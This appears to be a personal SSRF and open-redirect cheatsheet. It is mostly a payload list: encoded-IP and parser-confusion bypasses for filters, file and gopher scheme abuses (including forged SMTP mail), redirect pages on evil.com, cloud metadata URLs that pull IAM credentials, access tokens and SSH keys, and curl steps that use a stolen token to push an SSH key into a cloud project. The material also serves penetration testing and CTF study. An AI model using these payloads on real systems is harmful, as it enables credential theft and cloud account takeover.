---
title: SSRF Cheatsheet
tags: ssrf open-redirect cheatsheet 
---


# SSRF


Hello there,below is a list of most common SSRF payloads and open-redirect bypasses 

### SSRF & Open Redirect Bypass

- With [::], abuses IPV6

[http://[::]/](.)

[http://[::]:80/](.)

[http://[::]:25/](.) SMTP

[http://[::]:22/](.) SSH

[http://[::]:3128/](.) Squid

[http://0000::1/](.)

[http://0000::1:80/](.)

[http://0000::1:25/](.) SMTP

[http://0000::1:22/](.) SSH

[http://0000::1:3128/](.)Squid

- With domain redirection, useful when all IP addresses are blacklisted

[http://localtest.me](.)

[http://test.app.127.0.0.1.nip.io](.)

[http://test-app-127-0-0-1.nip.io](.)

[httP://test.app.127.0.0.1.xip.io](.)

- With CIDR, useful when just 127.0.0.1 is whitelisted

[http://127.127.127.127/](.)

[http://127.0.1.3/](.)

[https:/127.0.0.0/](.)

- With IPv6/IPv4 address embedding, useful when both IPv4 and IPv6 are blacklisted (but blacklisted badly)

[http://[0:0:0:0:0:ffff:127.0.0.1]/](.)

- With decimal IP location, really useful if dots are blacklisted

[http://0177.0.0.1/](.) --> (127.0.0.1)

[http://2130706433/](.) --> (127.0.0.1)

[http://3232235521/] (.)--> (192.168.0.1)

[http://3232235777/](.) --> (192.168.1.1)

- With malformed URLs, useful when port is blacklisted

[localhost:+11211aaa](.)

[localhost:00011211aaaa](.)

[localhost:11211](.)

- With shorthanding IP addresses by dropping zeros, useful when full IP address is whitelisted

[http://0/](.)

[http://127.1/](.)

[http://127.0.1/](.)

-With enclosed alphanumerics, useful when just plain ASCII characters are blacklisted but servers interpret enclosed alphanumerics as normal.

[http://①②⑦.⓪.⓪.①/](.)

[http://⓵⓶⓻.⓪.⓪.⓵/](.)

- With bash variables (cURL only)

curl -v "http://attacker$google.com"; $google = ""

Against weak parsers (these go to http://127.2.2.2:80)

[http://127.1.1.1:80\@127.2.2.2:80/](.)

[http://127.1.1.1:80\@@127.2.2.2:80/](.)

[http://127.1.1.1:80:\@@127.2.2.2:80/](.)

[http://127.1.1.1:80#\@127.2.2.2:80/](.)

Bypass 169.254.169.254 address

-The most common bypass for AWS addresses is changing them to get past the blacklist of 169.245.169.254.

[http://169.254.169.254.xip.io/](.)

[http://1ynrnhl.xip.io](.)

[http://425.510.425.510](.) – dotted decimal with overflow

[http://2852039166](.)– dotless decimal

[http://7147006462](.) – dotless decimal with overflow

[http://0xA9.0xFE.0xA9.0xFE](.) – dotted hexadecimal

[http://0xA9FEA9FE](.) – dotless hexadecimal

[http://0x41414141A9FEA9FE](.) – dotless hexadecimal with overflow

[http://0251.0376.0251.0376](.) – dotted octal

[http://0251.00376.000251.0000376](.) – dotted octal with padding

[http://2130706433/](.)

[http://[0:0:0:0:0:ffff:127.0.0.1]](.)

[localhost:+11211aaa](.)

[localhost:00011211aaaa](.)

[http://0/](.)

[http://127.1](.)

[http://127.0.1](.)

[http://0.0.0.0:22](.)

[http://[::]:80/](.)

[http://[::]:25/](.) SMTP

[http://[::]:22/](.) SSH

[http://0000::1:80/](.)

[http://1.1.1.1 &@2.2.2.2# @3.3.3.3/](.)

[0://evil.com:80;http://google.com:80/](.)

[http://127.1.1.1:80\@127.2.2.2:80/](.)

[http://127.1.1.1:80\@@127.2.2.2:80/](.)

[http://127.1.1.1:80:\@@127.2.2.2:80/](.)

[http://127.1.1.1:80#\@127.2.2.2:80/](.)

[http://169.254.169.254](.)

[http://metadata.nicob.net/](.)

[http://169.254.169.254.xip.io/](.)

[http://1ynrnhl.xip.io/](.)

[http://www.owasp.org.1ynrnhl.xip.io/](.)

[http://425.510.425.510/](.) Dotted decimal with overflow

[http://2852039166/](.) Dotless decimal

[http://7147006462/](.) Dotless decimal with overflow

[http://0xA9.0xFE.0xA9.0xFE/](.)  Dotted hexadecimal

[http://0xA9FEA9FE/](.) Dotless hexadecimal

[http://0x41414141A9FEA9FE/](.) Dotless hexadecimal with overflow

[http://0251.0376.0251.0376/](.) Dotted octal

[http://0251.00376.000251.0000376/](.) Dotted octal with padding

[http://whitelist-domain.internal_domain_or_ip/page](.)

[http://whitelist-domain@internal_domain_or_ip/page](.)

[http://internal_domain_or_ip#.whitelist-domain/page](.)

[http://internal_domain_or_ip?.whitelist-domain/page](.)

[http://internal_domain_or_ip\.whitelist-domain/page](.)

[https://ⓦⓦⓦ.ⓗⓐⓗⓦⓤⓛ.ⓒⓞⓜ = www.hahwul.com](.)

[https://whitelist-domain.hahwul.com](.)

[https://whitelist-domain@hahwul.com](.)

[https://www.example.com#whitelist-domain](.)

[https://www.example.com?whitelist-domain](.)

[https://www.example.com\whitelist-domain](.)

[https://www.example.com&whitelist-domain](.)

[http:///////////www.example.com](.)

[http:\\www.example.com](.)

[http:\/\/www.example.com](.)


## SSRF exploitation via URL Scheme

- File
Allows an attacker to fetch the content of a file on the server

[file://path/to/file](.)

[file:///etc/passwd](.)

[file://\/\/etc/passwd](.)

ssrf.php?url=file:///etc/passwd

- HTTP
Allows an attacker to fetch any content from the web, it can also be used to scan ports.

[ssrf.php?url=http://127.0.0.1:22](.)

[ssrf.php?url=http://127.0.0.1:80](.)

[ssrf.php?url=http://127.0.0.1:443](.)

- Dict
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>

ssrf.php?url=dict://attacker:11111/

- SFTP
A network protocol used for secure file transfer over secure shell

[ssrf.php?url=sftp://evil.com:11111/](.)

- TFTP
Trivial File Transfer Protocol, works over UDP

[ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET](.)

- LDAP
Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

- Gopher

```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH
You didn't say the magic word !
.
QUIT
Gopher HTTP
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
Gopher SMTP — Back connect to 1337
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>
Now query it.
https://example.com/?q=http://evil.com/redirect.php.
Gopher SMTP — send a mail
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );
        $payload = implode('%0A', $commands);
        header('Location: gopher://0:25/_'.$payload);
?>
```

- SSRF to XSS
by @D0rkerDevil & @alyssa.o.herrera

[http://brutelogic.com.br/poc.svg](.) -> simple alert

[https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=](.) -> simple ssrf

[https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg](.)

- HTTP redirect

Static:[http://nicob.net/redir6a](.)

Dynamic:[http://nicob.net/redir-http-169.254.169.254:80-](.)

- Alternate IP encoding

[http://425.510.425.510/](.) Dotted decimal with overflow

[http://2852039166/](.) Dotless decimal
[http://7147006462/](.) Dotless decimal with overflow

[http://0xA9.0xFE.0xA9.0xFE/](.) Dotted hexadecimal

[http://0xA9FEA9FE/](.) Dotless hexadecimal

[http://0x41414141A9FEA9FE/](.) Dotless hexadecimal with overflow

[http://0251.0376.0251.0376/](.) Dotted octal

[http://0251.00376.000251.0000376/](.) Dotted octal with padding

### METADATA

[http://169.254.169.254/latest/user-data](.)

[http://169.254.169.254/latest/user-data/iam/security-credentials/](.)[ROLE NAME]

[http://169.254.169.254/latest/meta-data/](.)

[http://169.254.169.254/latest/meta-data/iam/security-credentials/](.)[ROLE NAME]

[http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance](.)

[http://169.254.169.254/latest/meta-data/ami-id](.)

[http://169.254.169.254/latest/meta-data/reservation-id](.)

[http://169.254.169.254/latest/meta-data/hostname](.)

[http://169.254.169.254/latest/meta-data/public-keys/](.)

[http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key](.)

[http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key](.)

[http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy](.)

[http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access](.)

[http://169.254.169.254/latest/dynamic/instance-identity/document](.)

[http://metadata.google.internal/computeMetadata/v1beta1/](.)

[http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true](.)

[http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true](.)

SSH Public Key : [http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json](.)

Get Access Token : [http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token](.)

Kubernetes Key : [http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json](.)

[http://169.254.169.254/computeMetadata/v1/](.)

[http://metadata.google.internal/computeMetadata/v1/](.)

[http://metadata/computeMetadata/v1/](.)

[http://metadata.google.internal/computeMetadata/v1/instance/hostname](.)

[http://metadata.google.internal/computeMetadata/v1/instance/id](.)

[http://metadata.google.internal/computeMetadata/v1/project/project-id](.)

## List Dotted Char

[① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ](.)

[⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ](.)

[⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ](.)

[⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵](.)

[Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ](.)

[ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ](.)

[⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿](.)

- SSRF URL for Google Cloud
Requires the header “Metadata-Flavor: Google” or “X-Google-Metadata-Request: True”

[http://169.254.169.254/computeMetadata/v1/](.)

[http://metadata.google.internal/computeMetadata/v1/](.)

[http://metadata/computeMetadata/v1/](.)

[http://metadata.google.internal/computeMetadata/v1/instance/hostname](.)

[http://metadata.google.internal/computeMetadata/v1/instance/id](.)

[http://metadata.google.internal/computeMetadata/v1/project/project-id](.)
Google allows recursive pulls

[http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true](.)
Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

[http://metadata.google.internal/computeMetadata/v1beta1/](.)

[http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true](.)
Interesting files to pull out:

SSH Public Key : [http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json](.)

Get Access Token : [http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token](.)

Kubernetes Key : [http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json](.)
Add an SSH key

Extract the token

[http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json](.)

Check the scope of the token

```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
Now push the SSH key.
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
	-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
	-H "Content-Type: application/json" 
		--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
- SSRF URL for Digital Ocean

Documentation available at [https://developers.digitalocean.com/documentation/metadata/](.)

curl [http://169.254.169.254/metadata/v1/id](.)

[http://169.254.169.254/metadata/v1.json](.)

[http://169.254.169.254/metadata/v1/](.)

[http://169.254.169.254/metadata/v1/id](.)

[http://169.254.169.254/metadata/v1/user-data](.)

[http://169.254.169.254/metadata/v1/hostname](.)

[http://169.254.169.254/metadata/v1/region](.)

[http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address](.)

All in one request:
curl [http://169.254.169.254/metadata/v1.json | jq](.)

- SSRF URL for Packetcloud
Documentation available at [https://metadata.packet.net/userdata](.)

- SSRF URL for Azure

Limited, maybe more exists? [https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/](.)

[http://169.254.169.254/metadata/v1/maintenance](.)

Update Apr 2017, Azure has more support; requires the header “Metadata: true” [https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service](.)

[http://169.254.169.254/metadata/instance?api-version=2017-04-02](.)

[http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text](.)

- SSRF URL for OpenStack/RackSpace
(header required? unknown)

[http://169.254.169.254/openstack](.)

- SSRF URL for HP Helion
(header required? unknown)
[http://169.254.169.254/2009-04-04/meta-data/](.)

- SSRF URL for Oracle Cloud

[http://192.0.0.192/latest/](.)

[http://192.0.0.192/latest/user-data/](.)

[http://192.0.0.192/latest/meta-data/](.)

[http://192.0.0.192/latest/attributes/](.)

-SSRF URL for Alibaba

[http://100.100.100.200/latest/meta-data/](.)

[http://100.100.100.200/latest/meta-data/instance-id](.)

[http://100.100.100.200/latest/meta-data/image-id](.)

- SSRF URL for Kubernetes ETCD

Can contain API keys and internal ip and ports
curl -L [http://127.0.0.1:2379/version](.)

curl [http://127.0.0.1:2379/v2/keys/?recursive=true](.)

-SSRF URL for Docker

[http://127.0.0.1:2375/v1.24/containers/json](.)

Simple example

docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash

bash-4.4# curl --unix-socket /var/run/docker.sock [http://foo/containers/json](.)

bash-4.4# curl --unix-socket /var/run/docker.sock [http://foo/images/json](.)

- SSRF URL for Rancher
curl http://rancher-metadata/<version>/<path>

#### Further reading 

- [Orange,New-Era of SSRF](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf)

- [CTF-BIBLe,SSRF](https://github.com/k0imet/CTFs/tree/main/CTF-BIBLE/Web/SSRF)
